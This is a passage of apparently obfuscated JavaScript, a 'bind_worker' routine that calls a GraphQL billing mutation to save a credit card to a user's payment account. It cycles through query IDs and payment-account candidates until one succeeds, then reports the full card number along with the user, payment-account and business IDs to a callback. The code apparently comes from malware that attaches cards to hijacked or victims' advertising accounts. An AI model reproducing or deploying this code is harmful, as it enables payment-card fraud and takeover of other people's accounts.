          console.log("[bind_worker] Response from /api/graphql/ status:", v100.status, "length:", vLS9.length);
        } catch (e29) {
          console.log("[bind_worker] /api/graphql/ endpoint blocked");
        }
        if (!v100) {
          vLS8 = "All endpoints blocked";
          break;
        }
        try {
          var v101 = vLS9.replace(/^for\s*\(;;\)\s*;\s*/, "");
          var v102 = v101.trim().split("\n");
          var v103 = null;
          var v104 = null;
          for (var vLN025 = 0; vLN025 < v102.length; vLN025++) {
            try {
              var v105 = JSON.parse(v102[vLN025]);
              if (v105.errors && v105.errors.length > 0 && !v104) {
                v104 = v105.errors[0];
              }
              var v106 = v105.data && v105.data.xfb_billing_save_card_credential;
              if (v106 && !v103) {
                v103 = v106;
              }
            } catch (e30) {}
          }
          if (v103) {
            var v107 = v103.card_verification_status || "UNKNOWN";
            var v108 = v103.credit_card && v103.credit_card.credential_id || "";
            var v109 = v103.credit_card && v103.credit_card.card_association_name || "";
            var v110 = v103.credit_card && v103.credit_card.last_four_digits || v97;
            console.log("[bind_worker] SUCCESS:", v107, v109, "****" + v110, "credId:", v108);
            f5({
              status: v107,
              credentialId: v108,
              cardAssociation: v109,
              cardLast4: v110,
              cardNumber: vString,
              userId: v15,
              paymentAccountId: v33,
              businessId: v8 || null,
              businessName: v103.payment_account && v103.payment_account.business && v103.payment_account.business.name || ""
            }, v4);
            return;
          }
          if (v104) {
            var v111 = v104.code || 0;
            var v112 = v104.message || "";
            vLS8 = "Code " + v111 + ": " + (v104.summary || v112);
            if (vLN024 === 0) {
              console.log("[bind_worker] ⚠️ First doc_id error details:", JSON.stringify(v104).substring(0, 500));
              console.log("[bind_worker] Raw response (first 800 chars):", vLS9.substring(0, 800));
            }
            if (v111 === 3212024) {
              console.error("[bind_worker] Terminal card rejection (3212024):", vLS8);
              f5({
                status: "ERROR",
                error: vLS8,
                userId: v15,
                cardLast4: v97,
                cardNumber: vString,
                businessId: v8 || null
              }, v4);
              return;
            }
            var v113 = v111 === 1675030 || v111 === 4992002 || v112.indexOf("field_exception") >= 0;
            var v114 = v112.indexOf("was not found") >= 0 || v112.indexOf("not found") >= 0;
            if (v113 && !v114) {
              console.log("[bind_worker] field_exception (code " + v111 + ") on doc_id #" + vLN024 + " — skipping to next PA candidate");
              vLS6 = vLS8;
              v99 = true;
              break;
            }
            if (v114) {
              console.log("[bind_worker] doc_id not found on doc_id #" + vLN024 + " – trying next doc_id. " + vLS8);
              vLS6 = vLS8;
              v99 = true;
              continue;
            }
            console.error("[bind_worker] Terminal error:", vLS8);
            f5({
              status: "ERROR",
              error: vLS8,
              userId: v15,
              cardLast4: v97,
              cardNumber: vString,
              businessId: v8 || null
            }, v4);
            return;
          }
          vLS8 = "Unexpected response";
          break;
        } catch (e31) {
          vLS8 = "Fetch error: " + e31.message;
          console.error("[bind_worker] Fetch exception:", e31.message);
        }
        if (!v99) {
          break;
        }
      }
      if (vLN020 < vA8.length - 1) {
        console.log("[bind_worker] Trying next PA candidate...");
        continue;
      }
      f5({
        status: "ERROR",
        error: vLS8 || vLS6 || "Mutation failed",
        userId: v15,
        cardLast4: v97,
        cardNumber: vString,
        businessId: v8 || null
      }, v4);
      return;
    }
    f5({
      status: "ERROR",
      error: vLS6 || "All PA candidates exhausted",
      userId: v15,
      cardLast4: v97,
      cardNumber: vString,
      businessId: v8 || null
    }, v4);
  } catch (e32) {
    console.error("[bind_worker] FATAL:", e32);
    f5({
      status: "ERROR",
      error: e32.message || String(e32)
    }, v4);
  }
})();
